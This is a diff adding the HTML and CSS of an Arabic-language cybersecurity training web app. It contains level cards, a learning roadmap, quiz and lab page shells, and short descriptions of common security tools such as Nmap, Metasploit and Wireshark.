+  padding: 2px 8px; border-radius: 3px;
+  font-family: var(--font-mono); font-size: .68rem; letter-spacing: 1px;
+}
+.cat-recon    { background:rgba(0,229,255,0.08); color:var(--cyan);   border:1px solid rgba(0,229,255,0.2); }
+.cat-exploit  { background:rgba(255,0,64,0.08);  color:var(--red);    border:1px solid rgba(255,0,64,0.2); }
+.cat-defense  { background:rgba(0,255,65,0.08);  color:var(--green);  border:1px solid rgba(0,255,65,0.2); }
+.cat-forensic { background:rgba(255,204,0,0.08); color:var(--yellow); border:1px solid rgba(255,204,0,0.2); }
+.cat-network  { background:rgba(255,107,0,0.08); color:var(--orange); border:1px solid rgba(255,107,0,0.2); }
+
+/* ============================================================  CERTS */
+.certs-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
+  gap: 18px;
+}
+.cert-card {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 8px; padding: 22px; transition: all .3s;
+  position: relative; overflow: hidden;
+}
+.cert-card:hover { transform: translateY(-3px); }
+.cert-card::before {
+  content: '';
+  position: absolute; top: 0; left: 0; right: 0; height: 2px;
+}
+.cert-c1::before{background:var(--red);}
+.cert-c2::before{background:var(--green);}
+.cert-c3::before{background:var(--cyan);}
+.cert-c4::before{background:var(--orange);}
+.cert-c5::before{background:var(--yellow);}
+
+.cert-icon { font-size: 2.2rem; margin-bottom: 10px; }
+.cert-name { font-family: var(--font-head); font-size: 1.1rem; font-weight: 700; letter-spacing: 1px; margin-bottom: 4px; }
+.cert-org  { font-family: var(--font-mono); font-size: .72rem; color: var(--text-dim); margin-bottom: 12px; }
+.cert-desc { color: var(--text-dim); font-size: .82rem; line-height: 1.6; margin-bottom: 14px; font-family: var(--font-mono); }
+.cert-badges { display: flex; gap: 8px; flex-wrap: wrap; }
+.cert-badge {
+  background: var(--panel); border: 1px solid var(--border);
+  border-radius: 3px; padding: 3px 8px;
+  font-family: var(--font-mono); font-size: .7rem; color: var(--text-dim);
+}
+
+/* ============================================================  PROGRESS */
+.prog-overview {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+  gap: 14px; margin-bottom: 24px;
+}
+.prog-box {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 8px; padding: 18px; text-align: center;
+}
+.prog-big { font-family: var(--font-mono); font-size: 2.2rem; font-weight: bold; }
+.g{color:var(--green);} .c{color:var(--cyan);} .o{color:var(--orange);} .r{color:var(--red);}
+.prog-lbl { font-family: var(--font-mono); font-size: .72rem; color: var(--text-dim); margin-top: 4px; letter-spacing: 1px; }
+
+.xp-section {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 8px; padding: 20px; margin-bottom: 20px;
+}
+.xp-row { display: flex; justify-content: space-between; margin-bottom: 10px; align-items: center; }
+.xp-row .xp-title { font-family: var(--font-head); font-weight: 700; letter-spacing: 1px; }
+.xp-row .xp-val   { font-family: var(--font-mono); font-size: .8rem; color: var(--text-dim); }
+.xp-track { height: 8px; background: rgba(255,255,255,0.05); border-radius: 4px; overflow: hidden; }
+.xp-fill  {
+  height: 100%; border-radius: 4px;
+  background: linear-gradient(90deg, var(--green-dim), var(--green));
+  box-shadow: var(--glow-g);
+  transition: width 1.5s cubic-bezier(.23,1,.32,1);
+}
+
+.achv-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+  gap: 12px;
+}
+.achv {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 8px; padding: 16px; text-align: center; transition: all .3s;
+}
+.achv.unlocked { border-color: rgba(255,204,0,0.3); }
+.achv.unlocked:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(255,204,0,0.12); }
+.achv.locked { opacity: .35; filter: grayscale(1); }
+.achv-icon { font-size: 1.8rem; margin-bottom: 7px; }
+.achv-name { font-family: var(--font-head); font-size: .82rem; font-weight: 700; letter-spacing: 1px; }
+.achv-desc { font-family: var(--font-mono); font-size: .68rem; color: var(--text-dim); margin-top: 4px; }
+
+/* ============================================================  LEVEL PROG BARS PAGE */
+.lvl-pg-bars { display: flex; flex-direction: column; gap: 12px; margin-bottom: 24px; }
+.lvl-pg-row {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 8px; padding: 14px 18px;
+}
+.lvl-pg-row-hd { display: flex; justify-content: space-between; margin-bottom: 8px; }
+.lvl-pg-row-hd span:first-child { font-family: var(--font-head); font-size: .9rem; font-weight: 600; }
+.lvl-pg-row-hd span:last-child  { font-family: var(--font-mono); font-size: .75rem; }
+.mini-bar { height: 5px; background: rgba(255,255,255,0.05); border-radius: 3px; overflow: hidden; }
+.mini-bar-fill { height: 100%; border-radius: 3px; transition: width 1.2s ease; }
+
+/* ============================================================  PWA INSTALL */
+#pwa-banner {
+  position: fixed; bottom: 20px; left: 20px; z-index: 999;
+  background: var(--panel2);
+  border: 1px solid var(--border-hot);
+  border-radius: 8px; padding: 16px 20px;
+  display: none; align-items: center; gap: 14px;
+  box-shadow: var(--glow-g);
+  animation: slideUp .4s ease;
+  max-width: 320px;
+}
+#pwa-banner.on { display: flex; }
+@keyframes slideUp { from{transform:translateY(16px);opacity:0}to{transform:translateY(0);opacity:1} }
+.pwa-text strong { display: block; font-family: var(--font-head); font-size: .95rem; letter-spacing: 1px; }
+.pwa-text span   { font-family: var(--font-mono); font-size: .72rem; color: var(--text-dim); }
+.pwa-install {
+  background: var(--green); border: none; color: var(--void);
+  font-family: var(--font-mono); font-size: .78rem; font-weight: bold;
+  padding: 8px 14px; border-radius: 3px; cursor: pointer; white-space: nowrap;
+  letter-spacing: 1px; transition: all .25s;
+}
+.pwa-install:hover { box-shadow: var(--glow-g); }
+.pwa-close { background: none; border: none; color: var(--text-dim); cursor: pointer; font-size: 1.1rem; }
+
+/* ============================================================  TOAST */
+.toast {
+  position: fixed; bottom: 80px; left: 50%; transform: translateX(-50%);
+  background: var(--panel2); border: 1px solid var(--border-hot);
+  padding: 10px 22px; border-radius: 4px;
+  font-family: var(--font-mono); font-size: .82rem; color: var(--green);
+  z-index: 2000; box-shadow: var(--glow-g);
+  animation: slideUp .3s ease;
+  white-space: nowrap;
+}
+
+/* ============================================================  GLITCH EFFECT */
+@keyframes glitch {
+  0%,100%{clip-path:inset(0 0 98% 0);transform:translate(-2px)}
+  20%    {clip-path:inset(20% 0 60% 0);transform:translate(2px)}
+  40%    {clip-path:inset(50% 0 30% 0);transform:translate(-2px)}
+  60%    {clip-path:inset(80% 0 5% 0); transform:translate(2px)}
+  80%    {clip-path:inset(10% 0 80% 0);transform:translate(-2px)}
+}
+.glitch { position: relative; display: inline-block; }
+.glitch::before,.glitch::after {
+  content: attr(data-text); position: absolute; top: 0; left: 0; right: 0;
+  overflow: hidden; opacity: .7;
+}
+.glitch::before { color: var(--red);  animation: glitch 4s infinite 0s;    left: -2px; }
+.glitch::after  { color: var(--cyan); animation: glitch 4s infinite 0.15s; left: 2px; }
+</style>
+</head>
+<body>
+
+<!-- MATRIX CANVAS -->
+<canvas id="matrix-canvas"></canvas>
+
+<!-- SPLASH -->
+<div id="splash">
+  <div class="splash-terminal">
+    <div class="splash-titlebar">
+      <div class="tb-dot r"></div><div class="tb-dot y"></div><div class="tb-dot g"></div>
+      <span style="margin-right:8px">root@cyberacad:~</span>
+    </div>
+    <div class="splash-body">
+      <div><span class="prompt">root@cyberacad:~$</span> <span class="cmd">./init_academy.sh</span></div>
+      <div class="out">[ OK ] تحميل وحدات الأمن السيبراني...</div>
+      <div class="out">[ OK ] تهيئة بيئة التدريب...</div>
+      <div class="out">[ OK ] تحميل المناهج والمختبرات...</div>
+      <div><span class="hi">[ ✓ ] CyberAcad v2.0 — جاهز للانطلاق</span></div>
+      <div><span class="prompt">root@cyberacad:~$</span> <span class="cursor-blink"></span></div>
+    </div>
+    <div class="splash-bar-wrap"><div class="splash-bar"></div></div>
+  </div>
+</div>
+
+<!-- PWA INSTALL BANNER -->
+<div id="pwa-banner">
+  <div class="pwa-text">
+    <strong>📲 تثبيت CyberAcad</strong>
+    <span>يعمل بدون إنترنت</span>
+  </div>
+  <button class="pwa-install" id="pwaBtn">INSTALL</button>
+  <button class="pwa-close" id="pwaClose">✕</button>
+</div>
+
+<!-- MAIN APP -->
+<div id="app">
+  <!-- HEADER -->
+  <header class="hdr">
+    <div class="hdr-logo">
+      <div class="hdr-icon"></div>
+      <div>
+        <div class="hdr-name">CYBER<span style="color:#fff">ACAD</span></div>
+        <div class="hdr-sub">SECURITY TRAINING PLATFORM</div>
+      </div>
+    </div>
+    <div class="hdr-chips">
+      <div class="hdr-chip">🔥 <b id="h-streak">0</b> يوم</div>
+      <div class="hdr-chip">⚡ <b id="h-xp">0</b> XP</div>
+      <div class="hdr-chip">📚 <b id="h-less">0</b>/52 درس</div>
+    </div>
+  </header>
+
+  <!-- NAV -->
+  <nav class="nav">
+    <button class="nav-btn active" onclick="goPage('home')"    id="nb-home">    &gt;_ الرئيسية</button>
+    <button class="nav-btn"        onclick="goPage('lessons')" id="nb-lessons"> 📖 المنهج</button>
+    <button class="nav-btn"        onclick="goPage('labs')"    id="nb-labs">    💻 المختبرات <span class="nb-tag">NEW</span></button>
+    <button class="nav-btn"        onclick="goPage('quiz')"    id="nb-quiz">    🧠 الاختبارات</button>
+    <button class="nav-btn"        onclick="goPage('roadmap')" id="nb-roadmap"> 🗺️ خارطة الطريق</button>
+    <button class="nav-btn"        onclick="goPage('tools')"   id="nb-tools">   🔧 الأدوات</button>
+    <button class="nav-btn"        onclick="goPage('certs')"   id="nb-certs">   🏆 الشهادات</button>
+    <button class="nav-btn"        onclick="goPage('progress')" id="nb-progress">📊 تقدمي</button>
+  </nav>
+
+  <!-- ========== HOME ========== -->
+  <div class="pg on" id="pg-home">
+    <div class="hero">
+      <div class="hero-ring"></div><div class="hero-ring"></div><div class="hero-ring"></div>
+      <div class="hero-tag">CYBERSECURITY TRAINING PLATFORM v2.0</div>
+      <h1>
+        تعلم <span class="g glitch" data-text="الأمن">الأمن</span><br>
+        <span class="r">السيبراني</span> احترافياً
+      </h1>
+      <p>// من الصفر الكامل إلى مستوى متخصص في اختبار الاختراق والدفاع السيبراني — بمحتوى عربي شامل ومختبرات تفاعلية</p>
+      <div class="hero-btns">
+        <button class="btn-hack" onclick="goPage('lessons')">START_LEARNING →</button>
+        <button class="btn-ghost" onclick="goPage('labs')">💻 ENTER_LABS</button>
+      </div>
+    </div>
+
+    <div class="stats-row">
+      <div class="stat-box"><div class="stat-n">52</div><div class="stat-l">LESSONS</div></div>
+      <div class="stat-box"><div class="stat-n">20</div><div class="stat-l">LABS</div></div>
+      <div class="stat-box"><div class="stat-n">4</div><div class="stat-l">LEVELS</div></div>
+      <div class="stat-box"><div class="stat-n">140+</div><div class="stat-l">QUIZ Q&A</div></div>
+      <div class="stat-box"><div class="stat-n">15</div><div class="stat-l">CERTS COVERED</div></div>
+      <div class="stat-box"><div class="stat-n">∞</div><div class="stat-l">OFFLINE PWA</div></div>
+    </div>
+
+    <div class="sec-hd" style="margin-bottom:6px">
+      <div class="sec-title">المسارات التعليمية <span class="hl">الأربعة</span></div>
+      <div class="sec-hd-line"></div>
+    </div>
+    <div class="sec-sub">// مسار متسلسل من المبتدئ المطلق إلى محترف الأمن السيبراني</div>
+    <div class="lvl-grid">
+      <div class="lvl-card l1" data-num="01" onclick="openLevel(1)">
+        <div class="lvl-badge">LVL-01 // BEGINNER</div>
+        <div class="lvl-title">أساسيات الأمن السيبراني</div>
+        <div class="lvl-desc">// مفاهيم الأمن، التهديدات، أنواع الهجمات، التشفير، أنظمة Linux الأساسية</div>
+        <div class="lvl-meta">
+          <div class="lvl-meta-item">📚 13 درس</div>
+          <div class="lvl-meta-item">⏱️ 8 ساعات</div>
+        </div>
+        <div class="lvl-prog-wrap"><div class="lvl-prog-bar" id="lp1" style="width:0%"></div></div>
+      </div>
+      <div class="lvl-card l2" data-num="02" onclick="openLevel(2)">
+        <div class="lvl-badge">LVL-02 // INTERMEDIATE</div>
+        <div class="lvl-title">الاستطلاع والاختراق</div>
+        <div class="lvl-desc">// Nmap، Metasploit، اختبار الاختراق، ثغرات الويب، OWASP Top 10</div>
+        <div class="lvl-meta">
+          <div class="lvl-meta-item">📚 13 درس</div>
+          <div class="lvl-meta-item">⏱️ 10 ساعات</div>
+        </div>
+        <div class="lvl-prog-wrap"><div class="lvl-prog-bar" id="lp2" style="width:0%"></div></div>
+      </div>
+      <div class="lvl-card l3" data-num="03" onclick="openLevel(3)">
+        <div class="lvl-badge">LVL-03 // ADVANCED</div>
+        <div class="lvl-title">الدفاع والتحليل الجنائي</div>
+        <div class="lvl-desc">// SOC، SIEM، تحليل الحوادث، Forensics، Malware Analysis، Threat Hunting</div>
+        <div class="lvl-meta">
+          <div class="lvl-meta-item">📚 13 درس</div>
+          <div class="lvl-meta-item">⏱️ 12 ساعات</div>
+        </div>
+        <div class="lvl-prog-wrap"><div class="lvl-prog-bar" id="lp3" style="width:0%"></div></div>
+      </div>
+      <div class="lvl-card l4" data-num="04" onclick="openLevel(4)">
+        <div class="lvl-badge">LVL-04 // EXPERT</div>
+        <div class="lvl-title">الاحتراف والتخصص</div>
+        <div class="lvl-desc">// Red Team، Cloud Security، Zero-Day، Bug Bounty، الشهادات الاحترافية</div>
+        <div class="lvl-meta">
+          <div class="lvl-meta-item">📚 13 درس</div>
+          <div class="lvl-meta-item">⏱️ 14 ساعات</div>
+        </div>
+        <div class="lvl-prog-wrap"><div class="lvl-prog-bar" id="lp4" style="width:0%"></div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== LESSONS ========== -->
+  <div class="pg" id="pg-lessons">
+    <!-- Curriculum Home -->
+    <div id="cur-home">
+      <div class="sec-hd"><div class="sec-title">📖 <span class="hl">المنهج</span> الدراسي</div><div class="sec-hd-line"></div></div>
+      <div class="sec-sub">// اختر مستواك وابدأ رحلتك في الأمن السيبراني</div>
+      <div class="lvl-grid">
+        <div class="lvl-card l1" data-num="01" onclick="openLevel(1)">
+          <div class="lvl-badge">LVL-01 // BEGINNER</div>
+          <div class="lvl-title">أساسيات الأمن السيبراني</div>
+          <div class="lvl-desc">// البداية الصحيحة لدخول عالم الأمن</div>
+          <div class="lvl-meta"><div class="lvl-meta-item">📚 13 درس</div><div class="lvl-meta-item">🎯 مبتدئ</div></div>
+          <div class="lvl-prog-wrap"><div class="lvl-prog-bar" id="lp1b" style="width:0%"></div></div>
+        </div>
+        <div class="lvl-card l2" data-num="02" onclick="openLevel(2)">
+          <div class="lvl-badge">LVL-02 // INTERMEDIATE</div>
+          <div class="lvl-title">الاستطلاع والاختراق</div>
+          <div class="lvl-desc">// أدوات ومنهجيات اختبار الاختراق</div>
+          <div class="lvl-meta"><div class="lvl-meta-item">📚 13 درس</div><div class="lvl-meta-item">🎯 متوسط</div></div>
+          <div class="lvl-prog-wrap"><div class="lvl-prog-bar" id="lp2b" style="width:0%"></div></div>
+        </div>
+        <div class="lvl-card l3" data-num="03" onclick="openLevel(3)">
+          <div class="lvl-badge">LVL-03 // ADVANCED</div>
+          <div class="lvl-title">الدفاع والتحليل الجنائي</div>
+          <div class="lvl-desc">// Blue Team، SOC، Forensics</div>
+          <div class="lvl-meta"><div class="lvl-meta-item">📚 13 درس</div><div class="lvl-meta-item">🎯 متقدم</div></div>
+          <div class="lvl-prog-wrap"><div class="lvl-prog-bar" id="lp3b" style="width:0%"></div></div>
+        </div>
+        <div class="lvl-card l4" data-num="04" onclick="openLevel(4)">
+          <div class="lvl-badge">LVL-04 // EXPERT</div>
+          <div class="lvl-title">الاحتراف والتخصص</div>
+          <div class="lvl-desc">// Red Team، Cloud، Bug Bounty</div>
+          <div class="lvl-meta"><div class="lvl-meta-item">📚 13 درس</div><div class="lvl-meta-item">🎯 خبير</div></div>
+          <div class="lvl-prog-wrap"><div class="lvl-prog-bar" id="lp4b" style="width:0%"></div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Lesson View -->
+    <div id="les-view" class="lesson-wrap">
+      <div class="breadcrumb">
+        <a onclick="backToLessons()">📖 المنهج</a>
+        <span>›</span><span id="bc-lvl">المستوى 1</span>
+        <span>›</span><span id="bc-les">الدرس</span>
+      </div>
+      <div class="lesson-hdr">
+        <div class="lesson-num-tag" id="les-num-tag">// LESSON 01 — LEVEL 01</div>
+        <div class="lesson-main-title" id="les-title">عنوان الدرس</div>
+        <div class="lesson-main-desc"  id="les-desc">وصف الدرس</div>
+      </div>
+      <div class="lesson-layout">
+        <div class="lesson-body" id="les-body"><!-- content --></div>
+        <div class="lesson-sidebar">
+          <div class="side-card">
+            <h4>// TOPICS</h4>
+            <ul class="topic-list" id="topic-list"></ul>
+          </div>
+          <div class="side-card">
+            <h4>// QUICK_FACT</h4>
+            <p style="font-family:var(--font-mono);font-size:.78rem;color:var(--text-dim);line-height:1.7" id="quick-fact">...</p>
+          </div>
+          <div class="lesson-nav">
+            <button class="btn-nav" onclick="prevLesson()">← PREV</button>
+            <button class="btn-nav green" onclick="nextLesson()">NEXT →</button>
+          </div>
+          <button class="btn-mark" onclick="markDone()">[ MARK COMPLETE ✓ ]</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== LABS ========== -->
+  <div class="pg" id="pg-labs">
+    <div id="lab-home">
+      <div class="sec-hd"><div class="sec-title">💻 <span class="hl">المختبرات</span> التفاعلية</div><div class="sec-hd-line"></div></div>
+      <div class="sec-sub">// بيئات محاكاة حقيقية لتطبيق ما تعلمته — WARNING: للأغراض التعليمية فقط</div>
+      <div class="lab-grid" id="lab-grid"></div>
+    </div>
+    <div id="lab-view" class="lab-terminal-wrap">
+      <div class="breadcrumb">
+        <a onclick="backToLabs()">💻 المختبرات</a>
+        <span>›</span><span id="lab-bc">المختبر</span>
+      </div>
+      <div class="lesson-hdr">
+        <div class="lesson-num-tag" id="lab-tag">// LAB</div>
+        <div class="lesson-main-title" id="lab-title">اسم المختبر</div>
+        <div class="lesson-main-desc" id="lab-desc">وصف المختبر</div>
+      </div>
+      <div style="background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:16px">
+        <h4 style="font-family:var(--font-mono);color:var(--green);font-size:.82rem;margin-bottom:10px;letter-spacing:2px">// OBJECTIVE</h4>
+        <p style="font-family:var(--font-mono);font-size:.83rem;color:var(--text-dim);line-height:1.7" id="lab-obj"></p>
+      </div>
+      <div class="lab-term">
+        <div class="lab-term-bar">
+          <div class="t-dot r"></div><div class="t-dot y"></div><div class="t-dot g"></div>
+          <span style="margin-right:10px" id="lab-term-title">terminal@cyberacad:~</span>
+        </div>
+        <div class="lab-term-screen" id="lab-screen"></div>
+        <div class="lab-input-row">
+          <span class="lab-prompt" id="lab-prompt">root@lab:~$</span>
+          <input class="lab-input" id="lab-input" placeholder="اكتب الأمر هنا..." autocomplete="off" spellcheck="false" dir="ltr">
+          <button class="hint-btn" onclick="showHint()">HINT</button>
+          <button class="lab-run" onclick="runCmd()">RUN</button>
+        </div>
+      </div>
+      <button class="btn-mark" style="margin-top:14px" onclick="completeLab()">[ COMPLETE LAB ✓ ]</button>
+    </div>
+  </div>
+
+  <!-- ========== QUIZ ========== -->
+  <div class="pg" id="pg-quiz">
+    <div class="sec-hd"><div class="sec-title">🧠 <span class="hl">اختبر</span> معلوماتك</div><div class="sec-hd-line"></div></div>
+    <div class="sec-sub">// اختر مستوى الاختبار وقيّم فهمك</div>
+
+    <div id="quiz-sel" class="quiz-lvl-grid">
+      <div class="qz-box l1" onclick="startQuiz(1)">
+        <div class="lvl-badge" style="margin-bottom:10px">LVL-01</div>
+        <div class="lvl-title">الأساسيات</div>
+        <div class="lvl-desc" style="font-size:.78rem">// 10 أسئلة على مفاهيم الأمن الأساسية</div>
+      </div>
+      <div class="qz-box l2" onclick="startQuiz(2)">
+        <div class="lvl-badge" style="margin-bottom:10px">LVL-02</div>
+        <div class="lvl-title">الاختراق والاستطلاع</div>
+        <div class="lvl-desc" style="font-size:.78rem">// 10 أسئلة على أدوات ومنهجيات الاختراق</div>
+      </div>
+      <div class="qz-box l3" onclick="startQuiz(3)">
+        <div class="lvl-badge" style="margin-bottom:10px">LVL-03</div>
+        <div class="lvl-title">الدفاع والجنائيات</div>
+        <div class="lvl-desc" style="font-size:.78rem">// 10 أسئلة على Blue Team وForensics</div>
+      </div>
+      <div class="qz-box l4" onclick="startQuiz(4)">
+        <div class="lvl-badge" style="margin-bottom:10px">FINAL EXAM</div>
+        <div class="lvl-title">الاختبار الشامل</div>
+        <div class="lvl-desc" style="font-size:.78rem">// 20 سؤال من جميع المستويات</div>
+      </div>
+    </div>
+
+    <div class="quiz-arena" id="quiz-arena">
+      <div class="quiz-hd">
+        <div class="q-prog-track" id="q-dots"></div>
+        <div class="q-meta" id="q-meta">QUESTION 1/10</div>
+        <div class="q-text" id="q-text"></div>
+      </div>
+      <div class="q-opts" id="q-opts"></div>
+      <div class="q-feedback" id="q-fb"></div>
+      <div style="display:flex;gap:10px">
+        <button class="btn-nav green" id="btn-nxtq" onclick="nextQ()" style="display:none;flex:1">NEXT_QUESTION →</button>
+        <button class="btn-nav" onclick="endQuiz()" style="flex:1">END_QUIZ</button>
+      </div>
+    </div>
+
+    <div class="quiz-result-wrap" id="quiz-res">
+      <div class="result-panel">
+        <div class="result-big" id="res-emoji">🔐</div>
+        <div class="result-score" id="res-score"></div>
+        <div class="result-msg" id="res-msg"></div>
+        <div style="display:flex;gap:12px;justify-content:center;flex-wrap:wrap">
+          <button class="btn-hack" onclick="resetQuiz()">RETRY_QUIZ</button>
+          <button class="btn-ghost" onclick="goPage('lessons')">BACK_TO_LESSONS</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== ROADMAP ========== -->
+  <div class="pg" id="pg-roadmap">
+    <div class="sec-hd"><div class="sec-title">🗺️ خارطة <span class="hl">الطريق</span></div><div class="sec-hd-line"></div></div>
+    <div class="sec-sub">// المسار الاحترافي المثالي من المبتدئ إلى خبير الأمن السيبراني</div>
+    <div class="roadmap">
+      <div class="rm-spine"></div>
+      <div class="rm-phase"><div class="rm-dot active"></div>
+        <div class="rm-card">
+          <div class="rm-card-hd"><div class="rm-num">01</div><div class="rm-title">أساسيات الحاسوب والشبكات</div><div class="rm-dur">3-4 أسابيع</div></div>
+          <div class="rm-tags">
+            <span class="rm-tag">أساسيات Linux</span><span class="rm-tag">أوامر Terminal</span>
+            <span class="rm-tag">شبكات TCP/IP</span><span class="rm-tag">بروتوكولات HTTP/HTTPS</span>
+            <span class="rm-tag">DNS وARP</span><span class="rm-tag">أساسيات Python</span>
+          </div>
+        </div>
+      </div>
+      <div class="rm-phase"><div class="rm-dot"></div>
+        <div class="rm-card">
+          <div class="rm-card-hd"><div class="rm-num">02</div><div class="rm-title">مفاهيم الأمن الأساسية</div><div class="rm-dur">3-4 أسابيع</div></div>
+          <div class="rm-tags">
+            <span class="rm-tag">CIA Triad</span><span class="rm-tag">أنواع التشفير</span>
+            <span class="rm-tag">PKI والشهادات</span><span class="rm-tag">أنواع الهجمات</span>
+            <span class="rm-tag">Social Engineering</span><span class="rm-tag">OWASP Top 10</span>
+          </div>
+        </div>
+      </div>
+      <div class="rm-phase"><div class="rm-dot"></div>
+        <div class="rm-card">
+          <div class="rm-card-hd"><div class="rm-num">03</div><div class="rm-title">الاستطلاع وجمع المعلومات</div><div class="rm-dur">3-5 أسابيع</div></div>
+          <div class="rm-tags">
+            <span class="rm-tag">OSINT</span><span class="rm-tag">Nmap فحص الشبكات</span>
+            <span class="rm-tag">Shodan</span><span class="rm-tag">Recon-ng</span>
+            <span class="rm-tag">TheHarvester</span><span class="rm-tag">فحص DNS</span>
+          </div>
+        </div>
+      </div>
+      <div class="rm-phase"><div class="rm-dot"></div>
+        <div class="rm-card">
+          <div class="rm-card-hd"><div class="rm-num">04</div><div class="rm-title">اختبار الاختراق (Pentesting)</div><div class="rm-dur">6-8 أسابيع</div></div>
+          <div class="rm-tags">
+            <span class="rm-tag">Metasploit Framework</span><span class="rm-tag">Burp Suite</span>
+            <span class="rm-tag">SQL Injection</span><span class="rm-tag">XSS</span>
+            <span class="rm-tag">Privilege Escalation</span><span class="rm-tag">Post Exploitation</span>
+          </div>
+        </div>
+      </div>
+      <div class="rm-phase"><div class="rm-dot"></div>
+        <div class="rm-card">
+          <div class="rm-card-hd"><div class="rm-num">05</div><div class="rm-title">الدفاع والاستجابة للحوادث</div><div class="rm-dur">4-6 أسابيع</div></div>
+          <div class="rm-tags">
+            <span class="rm-tag">SIEM (Splunk/ELK)</span><span class="rm-tag">IDS/IPS</span>
+            <span class="rm-tag">Firewall Rules</span><span class="rm-tag">Log Analysis</span>
+            <span class="rm-tag">Incident Response</span><span class="rm-tag">Threat Intelligence</span>
+          </div>
+        </div>
+      </div>
+      <div class="rm-phase"><div class="rm-dot"></div>
+        <div class="rm-card">
+          <div class="rm-card-hd"><div class="rm-num">06</div><div class="rm-title">التحليل الجنائي الرقمي</div><div class="rm-dur">4-5 أسابيع</div></div>
+          <div class="rm-tags">
+            <span class="rm-tag">Volatility</span><span class="rm-tag">Autopsy</span>
+            <span class="rm-tag">Wireshark</span><span class="rm-tag">Memory Forensics</span>
+            <span class="rm-tag">Disk Forensics</span><span class="rm-tag">Network Forensics</span>
+          </div>
+        </div>
+      </div>
+      <div class="rm-phase"><div class="rm-dot"></div>
+        <div class="rm-card">
+          <div class="rm-card-hd"><div class="rm-num">07</div><div class="rm-title">تحليل البرمجيات الخبيثة</div><div class="rm-dur">4-6 أسابيع</div></div>
+          <div class="rm-tags">
+            <span class="rm-tag">Static Analysis</span><span class="rm-tag">Dynamic Analysis</span>
+            <span class="rm-tag">Reverse Engineering</span><span class="rm-tag">IDA Pro/Ghidra</span>
+            <span class="rm-tag">Sandbox Analysis</span><span class="rm-tag">Yara Rules</span>
+          </div>
+        </div>
+      </div>
+      <div class="rm-phase"><div class="rm-dot"></div>
+        <div class="rm-card">
+          <div class="rm-card-hd"><div class="rm-num">08</div><div class="rm-title">الاحتراف والشهادات</div><div class="rm-dur">3-6 أشهر</div></div>
+          <div class="rm-tags">
+            <span class="rm-tag">CEH</span><span class="rm-tag">OSCP</span>
+            <span class="rm-tag">CompTIA Security+</span><span class="rm-tag">CISSP</span>
+            <span class="rm-tag">Bug Bounty</span><span class="rm-tag">Red Team Ops</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== TOOLS ========== -->
+  <div class="pg" id="pg-tools">
+    <div class="sec-hd"><div class="sec-title">🔧 أدوات <span class="hl">الأمن السيبراني</span></div><div class="sec-hd-line"></div></div>
+    <div class="sec-sub">// الأدوات الأساسية التي يستخدمها كل متخصص أمن سيبراني</div>
+    <div class="tools-grid">
+      <div class="tool-card"><div class="tool-icon">🗺️</div><div class="tool-name">Nmap</div><div class="tool-desc">// أقوى أداة فحص شبكات في العالم. تكتشف الأجهزة والمنافذ والخدمات والأنظمة</div><span class="tool-cat cat-recon">RECON</span></div>
+      <div class="tool-card"><div class="tool-icon">💥</div><div class="tool-name">Metasploit</div><div class="tool-desc">// إطار اختبار الاختراق الأشهر. يحتوي آلاف الـ Exploits والـ Payloads الجاهزة</div><span class="tool-cat cat-exploit">EXPLOIT</span></div>
+      <div class="tool-card"><div class="tool-icon">🕷️</div><div class="tool-name">Burp Suite</div><div class="tool-desc">// أداة اختبار أمان تطبيقات الويب. Proxy، Scanner، Intruder، Repeater</div><span class="tool-cat cat-exploit">WEB</span></div>
+      <div class="tool-card"><div class="tool-icon">🦈</div><div class="tool-name">Wireshark</div><div class="tool-desc">// محلل حزم الشبكة. يلتقط ويحلل كل حزمة بيانات تمر عبر الشبكة</div><span class="tool-cat cat-network">NETWORK</span></div>
+      <div class="tool-card"><div class="tool-icon">🔑</div><div class="tool-name">Hashcat</div><div class="tool-desc">// أسرع أداة كسر كلمات المرور في العالم. تدعم MD5, SHA, bcrypt وغيرها</div><span class="tool-cat cat-exploit">CRACKING</span></div>
+      <div class="tool-card"><div class="tool-icon">🐉</div><div class="tool-name">Kali Linux</div><div class="tool-desc">// توزيعة Linux المخصصة للأمن السيبراني. تحتوي 600+ أداة أمنية جاهزة</div><span class="tool-cat cat-recon">PLATFORM</span></div>
+      <div class="tool-card"><div class="tool-icon">🔍</div><div class="tool-name">Volatility</div><div class="tool-desc">// أداة تحليل الذاكرة للتحليل الجنائي الرقمي. تستخرج البيانات من RAM dumps</div><span class="tool-cat cat-forensic">FORENSICS</span></div>
+      <div class="tool-card"><div class="tool-icon">📊</div><div class="tool-name">Splunk / ELK</div><div class="tool-desc">// منصات SIEM لجمع وتحليل السجلات الأمنية. أساس عمل SOC Center</div><span class="tool-cat cat-defense">DEFENSE</span></div>
+      <div class="tool-card"><div class="tool-icon">🕵️</div><div class="tool-name">OSINT Framework</div><div class="tool-desc">// إطار لجمع المعلومات من المصادر المفتوحة. LinkedIn, Shodan, WHOIS</div><span class="tool-cat cat-recon">OSINT</span></div>
+      <div class="tool-card"><div class="tool-icon">🔐</div><div class="tool-name">John the Ripper</div><div class="tool-desc">// أداة كسر كلمات المرور الكلاسيكية. تدعم قوائم الكلمات وهجمات القاموس</div><span class="tool-cat cat-exploit">CRACKING</span></div>
+      <div class="tool-card"><div class="tool-icon">🛡️</div><div class="tool-name">Snort / Suricata</div><div class="tool-desc">// أنظمة IDS/IPS مفتوحة المصدر. تراقب الشبكة وتكتشف الهجمات لحظياً</div><span class="tool-cat cat-defense">IDS/IPS</span></div>
